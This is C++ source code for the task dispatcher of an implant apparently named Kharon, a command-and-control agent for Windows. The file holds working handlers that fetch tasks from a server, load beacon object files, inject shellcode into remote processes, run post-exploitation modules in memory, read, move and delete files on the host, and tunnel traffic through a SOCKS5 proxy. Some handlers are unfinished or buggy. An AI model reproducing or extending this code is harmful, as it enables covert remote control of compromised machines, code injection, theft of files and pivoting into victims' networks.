#include <Kharon.h>

using namespace Root;

#define MAX_SOCKET_DATA_SIZE (1024 * 1024)
#define max(a,b) (((a) > (b)) ? (a) : (b))

auto DECLFN Task::Dispatcher(VOID) -> VOID {
    KhDbg("[====== Starting Dispatcher ======]");
    KhDbg("Initial heap allocation count: %d", Self->Hp->Count);

    PACKAGE* Package  = nullptr;
    PARSER*  Parser   = nullptr;
    PACKAGE* PostJobs = nullptr;
    PVOID    DataPsr  = nullptr;
    UINT64   PsrLen   = 0;
    PCHAR    TaskUUID = nullptr;
    BYTE     JobID    = 0;
    ULONG    TaskQtt  = 0;

    Package = Self->Pkg->NewTask();
    if ( ! Package ) {
        KhDbg("ERROR: Failed to create new task package");
        goto CLEANUP;
    }

    Parser = (PARSER*)hAlloc( sizeof(PARSER) );
    if ( ! Parser ) {
        KhDbg("ERROR: Failed to allocate parser memory");
        goto CLEANUP;
    }

    Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
    
    if (!DataPsr || !PsrLen) {
        KhDbg("ERROR: No data received or zero length");
        goto CLEANUP;
    }
    KhDbg("Received response %p [%d bytes]", DataPsr, PsrLen);

    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
    if ( ! Parser->Original ) { goto CLEANUP; }

    KhDbg("Parsed data %p [%d bytes]", Parser->Buffer, Parser->Length);

    JobID = Self->Psr->Byte( Parser );

    if ( JobID == Enm::Task::GetTask ) {
        KhDbg("Processing job ID: %d", JobID);
        TaskQtt = Self->Psr->Int32( Parser );
        KhDbg("Task quantity received: %d", TaskQtt);

        if ( TaskQtt > 0 ) {
            PostJobs = Self->Pkg->PostJobs();
            if ( !PostJobs ) {
                KhDbg("ERROR: Failed to create post jobs package");
                goto CLEANUP;
            }
 
            Self->Pkg->Int32( PostJobs, TaskQtt );

            for ( ULONG i = 0; i < TaskQtt; i++ ) {
                TaskUUID = Self->Psr->Str( Parser, 0 );
                if ( !TaskUUID ) {
                    KhDbg("WARNING: Invalid TaskUUID at index %d", i);
                    continue;
                }

                KhDbg("Creating job for task UUID: %s", TaskUUID);
                KhDbg(
                    "Parser state: %p, buffer: %p, length: %d", 
                    Parser, Parser->Buffer, Parser->Length
                );

                JOBS* NewJob = Self->Jbs->Create( TaskUUID, Parser );
                if ( ! NewJob ) {
                    KhDbg("WARNING: Failed to create job for task %d", i);
                    continue;
                }
            }

            Self->Jbs->ExecuteAll();
            Self->Jbs->Send( PostJobs );
        }
    }

CLEANUP:
    Self->Jbs->Cleanup();

    if ( DataPsr ) {
        hFree( DataPsr );
    }

    if ( Parser ) { 
        Self->Psr->Destroy( Parser );
    }

    if ( PostJobs ) {
        Self->Pkg->Destroy( PostJobs );
    }

    if ( Package ) {
        Self->Pkg->Destroy( Package );
    }

    KhDbg("Final heap allocation count: %d", Self->Hp->Count);
    KhDbg("[====== Dispatcher Finished ======]\n");
}

auto DECLFN Task::ExecBof(
    _In_ JOBS* Job
) -> ERROR_CODE {
    BOOL Success = FALSE;

    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    G_PACKAGE = Package;
    G_PARSER  = Parser;

    ULONG BofLen   = 0;
    BYTE* BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
    ULONG BofCmdID = Self->Psr->Int32( Parser );
    ULONG BofArgc  = 0;
    BYTE* BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );

    KhDbg("bof id  : %d", BofCmdID);
    KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);

    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );

    G_PACKAGE = nullptr;
    G_PARSER  = nullptr;

    if ( Success ) {
        return KhRetSuccess;
    } else {
        return KhGetError;
    }
}

auto DECLFN Task::Download(
    _In_ JOBS* Job
) -> ERROR_CODE {
}

auto DECLFN Task::Upload(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package  = Job->Pkg;
    PARSER*  Parser   = Job->Psr;
    BOOL     Success  = FALSE;    

    ULONG  UUIDLen = 0;
    PVOID  Data    = { 0 };
    SIZE_T Length  = 0;

    HANDLE FileHandle = INVALID_HANDLE_VALUE;

    BYTE* FileBuffer = B_PTR( hAlloc( KH_CHUNK_SIZE ) );
    ULONG FileLength = 0;
    BYTE* TmpBuffer  = { 0 };
    ULONG TmpLength  = 0;
    ULONG AvalBytes  = 0;

    CHAR* FileID    = nullptr;
    CHAR* FilePath  = nullptr;
    ULONG CurChunk  = 1;

    ULONG UploadState = Self->Psr->Int32( Parser );

    switch ( UploadState ) {
        case Enm::Up::Init: {
            for ( INT i = 0; i < 5; i++ ) {
                FileID = Self->Tsp->Up[i].FileID;
                
                if ( FileID || Str::LengthA( FileID ) ) {
                    continue;
                }
            }
            if ( FileID ) {
                CHAR* ErrorMsg = "The maximum number of files you can upload at the same time is 5";
                KhDbg( "%s", ErrorMsg );
                Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
                return KhRetSuccess;
            }

            FileID   = Self->Psr->Str( Parser, 0 );
            FilePath = Self->Psr->Str( Parser, 0 );

            if ( ! FilePath ) {
                FilePath = ".";
            }

            KhDbg( "uploading file at path %s with id: %s", FilePath, FileID );

            Self->Pkg->Int32( Package, CurChunk );
            Self->Pkg->Str( Package, FileID );
            Self->Pkg->Str( Package, FilePath );
            Self->Pkg->Int32( Package, KH_CHUNK_SIZE );

            KhDbg( "sending..." )
            KhDbg( "current chunk: %d", CurChunk );
            KhDbg( "file id      : %s", FileID );
            KhDbg( "path         : %s", FilePath );
            KhDbg( "chunk size   : %d", KH_CHUNK_SIZE );

            Self->Pkg->Transmit( Package, &Data, &Length );
                break;
        }
        case Enm::Up::Chunk: {
            INT8 Index = -1;

            FileID = Self->Psr->Str( Parser, 0 );
            
            for ( INT i = 0; i < 5; i++ ) {
                if ( Str::CompareA( FileID, Self->Tsp->Up[i].FileID ) == 0 ) {
                    Index = i; break;
                }
            }
            if ( Index == -1 ) {
                CHAR* ErrorMsg = "File ID not found";
                KhDbg( "%s", ErrorMsg );
                Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
                return KhRetSuccess;
            }
            break;
        }
    }

_KH_END:
    if ( FileBuffer ) hFree( FileBuffer );

    return KhGetError;
}

auto DECLFN Task::ScInject(
    _In_ JOBS* Job
) -> ERROR_CODE {
    KhDbg("dbg");
    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;

    KhDbg("dbg");
    ULONG    Length    = 0;
    KhDbg("dbg");
    BYTE*    Buffer    = Self->Psr->Bytes( Parser, &Length );
    KhDbg("dbg");
    ULONG    ProcessId = Self->Psr->Int32( Parser );
    KhDbg("dbg");
    INJ_OBJ* Object    = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );
    KhDbg("dbg");

    Object->ProcessId = ProcessId;

    if ( ! Self->Inj->Standard( Buffer, Length, nullptr, 0, Job->UUID, Object ) ) {
        Self->Pkg->SendMsg( Job->UUID, "Failed to inject into remote process", CALLBACK_ERROR );
        return KhGetError;
    }

    hFree( Object );

    return KhRetSuccess;
}

auto DECLFN Task::PostEx(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;
    CHAR*    DefUUID = Job->UUID;

    HANDLE   ReadPipe     = INVALID_HANDLE_VALUE;
    HANDLE   WritePipe    = INVALID_HANDLE_VALUE;
    HANDLE   BackupHandle = INVALID_HANDLE_VALUE;
    HANDLE   PipeHandle   = INVALID_HANDLE_VALUE;

    INJ_OBJ* Object = nullptr;

    PROCESS_INFORMATION PsInfo = { 0 };

    BYTE* Output = nullptr;

    ULONG Method  = Self->Psr->Int32( Parser );
    ULONG Length  = 0;
    BYTE* Buffer  = Self->Psr->Bytes( Parser, &Length );
    ULONG ArgLen  = 0;
    BYTE* ArgBuff = Self->Psr->Bytes( Parser, &ArgLen );

    Object = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );

    auto CleanupAndReturn = [&]( ERROR_CODE ErrorCode = KhGetError ) -> ERROR_CODE {
        if ( Output )      hFree( Output );
        if ( PipeHandle   != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( PipeHandle );
        if ( WritePipe    != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( WritePipe );
        if ( ReadPipe     != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ReadPipe );
        if ( BackupHandle != INVALID_HANDLE_VALUE ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupHandle );
        if ( PsInfo.hProcess ) {
            Self->Krnl32.TerminateProcess( PsInfo.hProcess, EXIT_SUCCESS );
            if ( PsInfo.hProcess ) Self->Ntdll.NtClose( PsInfo.hProcess );
            if ( PsInfo.hThread  ) Self->Ntdll.NtClose( PsInfo.hThread  );
        }
        if ( Object ) {
            if ( Object->BaseAddress  ) Self->Mm->Free( Object->BaseAddress, Length + ArgLen, MEM_RELEASE, Object->PsHandle );
            if ( Object->ThreadHandle ) Self->Ntdll.NtClose( Object->ThreadHandle );
            
            hFree( Object );
        } 
        
        return ErrorCode;
    };

    if ( Method == Enm::PostXpl::Inline ) {
        SECURITY_ATTRIBUTES SecAttr = { 
            .nLength = sizeof(SECURITY_ATTRIBUTES), 
            .lpSecurityDescriptor = nullptr,
            .bInheritHandle = TRUE
        };

        if ( ! Self->Krnl32.CreatePipe( &ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH ) ) {
            QuickErr( "Failed to create pipe" );
            return CleanupAndReturn();
        }

        BackupHandle = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
        Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, WritePipe );

        Object->PsHandle = NtCurrentProcess();
        Object->Persist  = TRUE;

        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
            QuickErr( "Failed to inject post-ex module");
            return CleanupAndReturn();
        }

        Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, INFINITE );

        Self->Ntdll.NtClose( WritePipe );
        WritePipe = INVALID_HANDLE_VALUE;

        ULONG BytesAvail = 0;
        if ( Self->Krnl32.PeekNamedPipe( ReadPipe, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
            Output = (BYTE*)hAlloc( BytesAvail );
            if ( Output ) {
                ULONG BytesRead = 0;
                if ( Self->Krnl32.ReadFile( ReadPipe, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
                    QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
                }
            }
        }

    // todo: make the fork and run option

    // } else if ( Method == Enm::PostXpl::Fork ) { 
    //     Self->Ps->Ctx.Pipe = FALSE;

    //     if ( ! Self->Ps->Create( "C:\\Windows\\System32\\cmd.exe", TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &PsInfo ) ) {
    //         QuickErr( "Failed in process creation: %d", KhGetError );
    //         return CleanupAndReturn( KhGetError );
    //     }

    //     Self->Krnl32.ResumeThread( PsInfo.hThread );

    //     KhDbg( "postex module running at pid %d tid %d", PsInfo.dwProcessId, PsInfo.dwThreadId );
    //     KhDbg( "postex module running at ph %d th %d", PsInfo.hProcess, PsInfo.hThread );

    //     Self->Ps->Ctx.Pipe = TRUE;

    //     Object->Persist   = TRUE;
    //     Object->ProcessId = PsInfo.dwProcessId;
    //     Object->PsHandle  = PsInfo.hProcess;

    //     if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
    //         QuickErr( "Injection failed in fork mode\n" );
    //         return CleanupAndReturn( KhGetError );
    //     }

    //     for (int i = 0; i < 10; i++) {
    //         if ( Self->Krnl32.WaitNamedPipeA( KH_FORK_PIPE_NAME, 5000 ) ) {
    //             break;
    //         }
    //         if (i == 9) {
    //             QuickErr("Pipe timeout\n");
    //         }
    //     }

    //     for (int i = 0; i < 10; i++) {
    //         PipeHandle = Self->Krnl32.CreateFileA(
    //             KH_FORK_PIPE_NAME,GENERIC_READ,
    //             0, NULL, OPEN_EXISTING, 0, NULL
    //         );
    //         if ( PipeHandle != INVALID_HANDLE_VALUE ) {
    //             break;
    //         }
            
    //         Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, 500 );
            
    //         if (i == 9) {
    //             KhDbg("Failed to connect to named pipe");
    //             return CleanupAndReturn(ERROR_TIMEOUT);
    //         }
    //     }

    //     ULONG BytesAvail = 0;
    //     if ( Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
    //         Output = (BYTE*)hAlloc( BytesAvail );
    //         if ( Output ) {
    //             ULONG BytesRead = 0;
    //             if ( Self->Krnl32.ReadFile( PipeHandle, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
    //                 QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
    //             }
    //         }
    //     }
    }

    return CleanupAndReturn( ERROR_SUCCESS );
}


auto DECLFN Task::FileSystem(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8    SbCommandID  = Self->Psr->Byte( Parser );

    ULONG    TmpVal  = 0;
    BOOL     Success = TRUE;
    BYTE*    Buffer  = { 0 };

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );
    
    switch ( SbCommandID ) {
        case Enm::Fs::ListFl: {
            WIN32_FIND_DATAA FindData     = { 0 };
            SYSTEMTIME       CreationTime = { 0 };
            SYSTEMTIME       AccessTime   = { 0 };
            SYSTEMTIME       WriteTime    = { 0 };

            HANDLE FileHandle = NULL;
            ULONG  FileSize   = 0;
            PCHAR  TargetDir  = Self->Psr->Str( Parser, &TmpVal );
            HANDLE FindHandle = Self->Krnl32.FindFirstFileA( TargetDir, &FindData );

            if ( FindHandle == INVALID_HANDLE_VALUE || !FindHandle ) break;
        
            do {
                FileHandle = Self->Krnl32.CreateFileA( FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
                FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
                
                Self->Ntdll.NtClose( FileHandle );

                Self->Pkg->Str( Package, FindData.cFileName );

                Self->Pkg->Int32( Package, FileSize );

                Self->Pkg->Int32( Package, FindData.dwFileAttributes );
        
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftCreationTime, &CreationTime );

                Self->Pkg->Int16( Package, CreationTime.wDay    );
                Self->Pkg->Int16( Package, CreationTime.wMonth  );
                Self->Pkg->Int16( Package, CreationTime.wYear   );
                Self->Pkg->Int16( Package, CreationTime.wHour   );
                Self->Pkg->Int16( Package, CreationTime.wMinute );
                Self->Pkg->Int16( Package, CreationTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &AccessTime );

                Self->Pkg->Int16( Package, AccessTime.wDay    );
                Self->Pkg->Int16( Package, AccessTime.wMonth  );
                Self->Pkg->Int16( Package, AccessTime.wYear   );
                Self->Pkg->Int16( Package, AccessTime.wHour   );
                Self->Pkg->Int16( Package, AccessTime.wMinute );
                Self->Pkg->Int16( Package, AccessTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastWriteTime, &WriteTime );

                Self->Pkg->Int16( Package, WriteTime.wDay    );
                Self->Pkg->Int16( Package, WriteTime.wMonth  );
                Self->Pkg->Int16( Package, WriteTime.wYear   );
                Self->Pkg->Int16( Package, WriteTime.wHour   );
                Self->Pkg->Int16( Package, WriteTime.wMinute );
                Self->Pkg->Int16( Package, WriteTime.wSecond );
        
            } while ( Self->Krnl32.FindNextFileA( FindHandle, &FindData ));
        
            Success = Self->Krnl32.FindClose( FindHandle );

            break;
        }
        case Enm::Fs::Cwd: {
            CHAR CurDir[MAX_PATH] = { 0 };

            Self->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 

            Self->Pkg->Str( Package, CurDir );

            break;
        }
        case Enm::Fs::Move: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.MoveFileA( SrcFile, DstFile ); 

            break;
        }
        case Enm::Fs::Copy: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );

            break;
        }
        case Enm::Fs::MakeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CreateDirectoryA( PathName, NULL );
            
            break;
        }
        case Enm::Fs::Delete: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.DeleteFileA( PathName );

            break;
        }
        case Enm::Fs::ChangeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.SetCurrentDirectoryA( PathName );

            break;
        }
        case Enm::Fs::Read: {
            PCHAR  PathName   = Self->Psr->Str( Parser, 0 );
            ULONG  FileSize   = 0;
            BYTE*  FileBuffer = { 0 };
            HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

            FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
            FileBuffer = B_PTR( hAlloc( FileSize ) );

            Success = Self->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );

            Buffer = FileBuffer;
            TmpVal = FileSize; 

            Self->Pkg->Bytes( Package, Buffer, TmpVal );

            break;
        }
    }

_KH_END:
    if ( !Success ) { return KhGetError; }
    if ( SbCommandID != Enm::Fs::ListFl || SbCommandID != Enm::Fs::Read || SbCommandID != Enm::Fs::Cwd ) {
        Self->Pkg->Int32( Package, Success );
    }

    if ( Buffer ) { hFree( Buffer ); }

    return KhRetSuccess;
}

auto DECLFN Task::Pivot(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubCmd = Self->Psr->Byte( Parser );

    KhDbg( "sub command id: %d", SubCmd );

    Self->Pkg->Byte( Package, SubCmd );    

    switch ( SubCmd ) {
        case Enm::Pivot::List: {

        }
        case Enm::Pivot::Link: {

        }
        case Enm::Pivot::Unlink: {

        }
    }
}

unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size);

auto DECLFN Task::Socks(
    _In_ JOBS* Job
) -> ERROR_CODE {
    KhDbg("Starting SOCKS task processing");
    
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    BOOL  IsExit    = Self->Psr->Int32(Parser);
    ULONG ServerID  = Self->Psr->Int32(Parser);

    ULONG B64DataLen   = 0;
    BYTE* B64Data = { 0 };
    ULONG DataLen = 0;
    BYTE* Data = { 0 };

    if (!IsExit) {
        B64Data = Self->Psr->Bytes(Parser, &B64DataLen);
    
        DataLen = Self->Pkg->Base64DecSize((PCHAR)B64Data);
        Data = (BYTE*)hAlloc(DataLen);
        if (!Data) {
            KhDbg("Failed to allocate memory for decoded data");
            return ERROR_OUTOFMEMORY;
        }
        base64_decode((PCHAR)B64Data, (PUCHAR)Data, DataLen);

    }

    KhDbg(
        "ServerID: %u, IsExit: %d", 
        ServerID, IsExit
    );
        
    BYTE* ResponseData = nullptr;
    ULONG ResponseLen  = 0;
    ERROR_CODE Result  = ERROR_SUCCESS;

    ULONG Operation;
    if (IsExit) {
        Operation = KH_SOCKET_CLOSE;
        KhDbg("Operation: CLOSE connection");
    } else if (Self->Skt->Exist(ServerID)) {
        Operation = KH_SOCKET_DATA;
        KhDbg("Operation: DATA for existing connection");
    } else {
        Operation = KH_SOCKET_NEW;
        KhDbg("Operation: NEW connection");
    }

    Self->Skt->LogData("received", Data, DataLen);

    switch ( Operation ) {
        case KH_SOCKET_NEW: {
            KhDbg("Starting new SOCKS5 connection");

            SOCKET newSocket = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (newSocket == INVALID_SOCKET) {
                DWORD err = KhGetError;
                KhDbg("Failed to create socket: 0x%X", err);
                return err;
            }
            KhDbg("Socket created: %llu", (ULONG64)newSocket);

            BOOL IsTLS = (DataLen > 0 && Data[0] == 0x16); // TLS Handshake record
            if (IsTLS) {
                KhDbg("Detected TLS/HTTPS connection - enabling passthrough mode");
            }

            ULONG targetIP = 0;
            USHORT targetPort = 0;
            ULONG headerSize = 0;

            if ( !IsTLS ) {
                if ( DataLen < 10 ) {
                    KhDbg("Insufficient data for SOCKS5 header");
                    Self->Ws2_32.closesocket( newSocket );
                    return ERROR_INVALID_DATA;
                }

                if ( Data[0] != 0x05 ) {
                    KhDbg( "Invalid SOCKS version: 0x%02X", Data[0] );
                    Self->Ws2_32.closesocket( newSocket );
                    return ERROR_INVALID_DATA;
                }

                switch ( Data[3] ) {  // Address type
                    case 0x01: { // IPv4
                        if ( DataLen < 10 ) {
                            KhDbg("Incomplete IPv4 data");
                            Self->Ws2_32.closesocket(newSocket);
                            return ERROR_INVALID_DATA;
                        }
                        targetIP   = *(ULONG* )(Data + 4);
                        targetPort = *(USHORT*)(Data + 8);
                        headerSize = 10;
                        
                        KhDbg("Connecting to IPv4: %d.%d.%d.%d:%d",
                              Data[4], Data[5], Data[6], Data[7], 
                              Self->Ws2_32.ntohs( targetPort )
                        );
                        break;
                    }
                    
                    case 0x03: { // Domain name
                        if (DataLen < 5) {
                            KhDbg("Incomplete domain data");
                            Self->Ws2_32.closesocket(newSocket);
                            return ERROR_INVALID_DATA;
                        }
                        UCHAR domainLen = Data[4];
                        headerSize = 5 + domainLen + 2;
                        
                        if (DataLen < headerSize) {
                            KhDbg("Incomplete domain data (size: %d, expected: %d)",
                                  DataLen, headerSize);
                            Self->Ws2_32.closesocket(newSocket);
                            return ERROR_INVALID_DATA;
                        }
                        
                        CHAR domain[MAX_PATH] = { 0 };

                        Mem::Copy(domain, Data + 5, domainLen);
                        
                        addrinfo hints    = { 0 };
                        hints.ai_family   = AF_INET;
                        hints.ai_socktype = SOCK_STREAM;
                        addrinfo* result  = nullptr;
                        
                        if ( Self->Ws2_32.getaddrinfo( domain, nullptr, &hints, &result ) != 0 ) {
                            KhDbg("Failed to resolve domain: %s", domain);
                            Self->Ws2_32.closesocket( newSocket );
                            return ERROR_NOT_FOUND;
                        }
                        
                        targetIP = ((sockaddr_in*)result->ai_addr)->sin_addr.s_addr;
                        targetPort = *(USHORT*)(Data + 5 + domainLen);
                        Self->Ws2_32.freeaddrinfo(result);
                        
                        KhDbg("Connecting to domain: %s:%d", domain, Self->Ws2_32.ntohs(targetPort));
                        break;
                    }
                    
                    default: {
                        KhDbg("Unsupported address type: 0x%02X", Data[3]);
                        Self->Ws2_32.closesocket(newSocket);
                        return ERROR_NOT_SUPPORTED;
                    }
                }
            } else {
                targetIP   = *(ULONG* )(Data + 4); // Adjust based on your protocol
                targetPort = *(USHORT*)(Data + 8); // Adjust based on your protocol
                headerSize = 0; // No SOCKS header for TLS
            }

            sockaddr_in targetAddr = { 0 };
            targetAddr.sin_family  = AF_INET;
            targetAddr.sin_addr.s_addr = targetIP;
            targetAddr.sin_port    = targetPort;

            BOOL noDelay = TRUE;
            Self->Ws2_32.setsockopt( newSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay) );

            KhDbg("Connecting to destination...");
            
            if ( Self->Ws2_32.connect( newSocket, (sockaddr*)&targetAddr, sizeof( targetAddr ) ) == SOCKET_ERROR ) {
                DWORD err = KhGetError;
                KhDbg("Connection failed: 0x%X", err);
                Self->Ws2_32.closesocket(newSocket);
                return err;
            }

            KhDbg("Connection established successfully");

            if ( !IsTLS ) {
                BYTE socksResponse[10] = { 
                    0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                };
                
                ResponseData = (BYTE*)hAlloc( sizeof(socksResponse) );
                if ( !ResponseData ) {
                    KhDbg("Failed to allocate memory for response");
                    Self->Ws2_32.closesocket( newSocket );
                    return ERROR_OUTOFMEMORY;
                }

                Mem::Copy(ResponseData, socksResponse, sizeof(socksResponse));
                ResponseLen = sizeof(socksResponse);

                KhDbg("SOCKS response (%d bytes):", ResponseLen);
            }

            ERROR_CODE err = Self->Skt->Add(ServerID, newSocket);
            if (err != ERROR_SUCCESS) {
                KhDbg("Failed to store socket: 0x%X", err);
                if (ResponseData) hFree(ResponseData);
                Self->Ws2_32.closesocket(newSocket);
                return err;
            }

            if ( DataLen > (IsTLS ? 0 : headerSize) ) {
                ULONG sendOffset = IsTLS ? 0 : headerSize;
                ULONG sendSize = DataLen - sendOffset;
                KhDbg("Sending %d bytes of initial data", sendSize);
                
                KhDbg("Data being sent (%d bytes):", sendSize);
                
                int bytesSent = Self->Ws2_32.send(
                    newSocket, (char*)(Data + sendOffset), sendSize, 0
                );
                
                if (bytesSent == SOCKET_ERROR) {
                    DWORD sendErr = KhGetError;
                    KhDbg("Error sending initial data: 0x%X (continuing)", sendErr);
                    Result = sendErr;
                } else {
                    KhDbg("Successfully sent %d bytes", bytesSent);
                }
            }
            break;
        }

        case KH_SOCKET_DATA: {
            KhDbg("Processing data for existing connection");

            SOCKET ActiveSock = Self->Skt->Get( ServerID );
            if ( ActiveSock == INVALID_SOCKET ) {
                KhDbg("Connection not found for ServerID: %u", ServerID);
                return ERROR_NOT_FOUND;
            }

            KhDbg("Input data to forward (%d bytes):", DataLen);

            if ( DataLen > 0 ) {
                Self->Skt->LogData( "Sending to target", Data, DataLen );

                INT32 DataSent = Self->Ws2_32.send( ActiveSock, (CHAR*)Data, DataLen, 0 );
                if ( DataSent == SOCKET_ERROR )  {
                    KhDbg( "err: %d", Self->Ws2_32.WSAGetLastError() ); break;
                }

                KhDbg( "Data sent" );

                ULONG BuffRecvL = max( 0x1000, DataLen * 2 );
                BYTE* BuffRecv  = (BYTE*)hAlloc( BuffRecvL );

                KhDbg( "Allocating buffer to receive data: %d", BuffRecvL );

                if ( BuffRecvL ) {
                    ULONG TotalRead = 0;
                    ULONG StartTime = Self->Krnl32.GetTickCount();

                    while ( ( Self->Krnl32.GetTickCount() - StartTime ) < 500 ) {
                        ULONG DataAvail = 0;
                        INT32 IoCtlRes  = Self->Ws2_32.ioctlsocket( ActiveSock, FIONREAD, &DataAvail );

                        KhDbg( "Io CTL Result=%d Avail=%lu", IoCtlRes, DataAvail );

                        if ( IoCtlRes == 0 && DataAvail > 0 ) {
                            if ( ( TotalRead + DataAvail ) > BuffRecvL ) {
                                ULONG NewLen  = BuffRecvL * 2;
                                BYTE* NewBuff = (BYTE*)Self->Hp->ReAlloc( BuffRecv, NewLen );

                                BuffRecv  = NewBuff;
                                BuffRecvL = NewLen;
                            }

                            ULONG DataRead = 0;

                            if ( 
                                Self->Skt->RecvAll( 
                                    ActiveSock, ( BuffRecv + TotalRead ), min( DataAvail, ( BuffRecvL - TotalRead ) ), &DataRead 
                                )
                            ) {
                                TotalRead += DataRead;
                                KhDbg( "Read %d bytes (Total %d)", DataRead, TotalRead );
                            } else {
                                KhDbg( "Recv failed: %d", Self->Ws2_32.WSAGetLastError() ); break;
                            }
                        } else if ( IoCtlRes != 0 ) {
                            KhDbg( "Io Ctl err: %d", Self->Ws2_32.WSAGetLastError() );
                        }

                        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 10 );
                    }

                    if ( TotalRead > 0 ) {
                        Self->Skt->LogData( "Sending to Srv", BuffRecv, BuffRecvL );
                        ResponseData = BuffRecv;
                        ResponseLen  = BuffRecvL;
                    } else {
                        KhDbg( "no data received within timout" );
                    }

                    hFree( BuffRecv );
                }
            } else {
                KhDbg( "no data to send" );
            }

            break;
        }

        case KH_SOCKET_CLOSE: {
            KhDbg("Closing SOCKS connection");

            SOCKET sockToClose = Self->Skt->Get(ServerID);
            if (sockToClose != INVALID_SOCKET) {
                KhDbg("Closing socket: %llu", (ULONG64)sockToClose);
                Self->Ws2_32.closesocket(sockToClose);
                Self->Skt->RmCtx(ServerID);
            } else {
                KhDbg("Socket not found for closing");
            }
            break;
        }

        default: {
            KhDbg("Unknown operation: %u", Operation);
            return ERROR_INVALID_PARAMETER;
        }
    }

    // Package response
    KhDbg("Preparing response - IsExit: %d, ServerID: %u, ResponseLen: %u",
          IsExit, ServerID, ResponseLen);
    
    Self->Pkg->Int32( Package, IsExit );
    Self->Pkg->Int32( Package, ServerID);

    if ( ResponseData ) {
        Self->Skt->LogData("sending", ResponseData, ResponseLen);

        PCHAR FinalPkt = Self->Pkg->Base64Enc(ResponseData, ResponseLen);
        ULONG FinalLen = Self->Pkg->Base64EncSize(ResponseLen);
        Self->Pkg->Bytes(Package, (PUCHAR)FinalPkt, FinalLen);
        hFree(ResponseData);
    }

    if ( Data ) {
        hFree(Data);
    }

    KhDbg("SOCKS task completed with status: 0x%X", Result);
    return Result;
}

// auto DECLFN Task::Socks(_In_ JOBS* Job) -> ERROR_CODE {
//     KhDbg("SOCKS5: Starting processing (Job: %p)", Job);

//     Self->Sckt->InitWSA();

//     PACKAGE* Package = Job->Pkg;
//     PARSER*  Parser  = Job->Psr;

//     BOOL  IsExit    = Self->Psr->Int32( Parser );
//     ULONG ServerID  = Self->Psr->Int32( Parser );

//     KhDbg("SOCKS5: Parameters - IsExit=%d, ServerID=%u", IsExit, ServerID);

//     BYTE* Data = nullptr;
//     ULONG DataLen = 0;
//     BYTE* B64Data = nullptr;
